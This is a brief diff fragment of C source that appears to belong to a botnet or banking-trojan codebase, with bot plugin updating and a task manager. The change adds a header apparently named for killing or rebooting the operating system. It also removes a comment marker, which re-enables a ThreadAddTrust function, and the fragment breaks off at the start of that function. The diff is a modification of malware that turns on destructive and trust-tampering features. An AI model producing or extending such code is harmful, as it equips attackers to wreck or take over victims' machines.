@@ -25,6 +25,7 @@
 #include <shlwapi.h>
 
 #include "Modules.h"
+#include "killos_reboot.h"
 
 #include "BotMonitorMsg.h"
 
@@ -1133,7 +1134,7 @@ bool ExecuteUpdatePlug(PTaskManager Manager, PCHAR Command, PCHAR Args)
      return UpdateBotPlug() != FALSE;
 }
 
-/*
+
 DWORD WINAPI ThreadAddTrust( char* nameFile )
 {
 	BYTE* data = 0;
